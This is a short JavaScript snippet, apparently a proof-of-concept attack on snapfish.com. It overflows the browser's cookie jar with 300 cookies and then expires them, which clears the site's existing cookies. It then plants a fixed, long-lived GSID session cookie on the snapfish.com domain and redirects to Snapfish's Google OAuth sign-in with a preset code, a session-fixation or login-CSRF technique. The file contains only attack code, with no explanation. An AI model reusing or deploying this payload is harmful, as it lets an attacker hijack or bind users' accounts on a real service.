cookiejar_size = 300;

for (let i = 0; i < cookiejar_size; i++) 
    document.cookie = `cookie${i}=a; Secure; path=/`;

for (let i = 0; i < cookiejar_size; i++) 
    document.cookie = `cookie${i}=a; expires=Thu, 01 Jan 1970 00:00:01 GMT; path=/`;

const expires = new Date();
expires.setFullYear(expires.getFullYear() + 10);

document.cookie = `GSID=aus-27e95bb9-7d53-4fb5-92c4-3e5646cc8f53-12345; Domain=snapfish.com; Path=/; Expires=${expires.toUTCString()}`;

window.location.href = "https://www.snapfish.com/v1/gw/snapfish/oauth/google/signin?TNCFlag=1&context=/hp/sf/sf-us/snapfish-us&sourceGroup=sf-store&code=484210975577308&SubscriptionFlag=ALL";
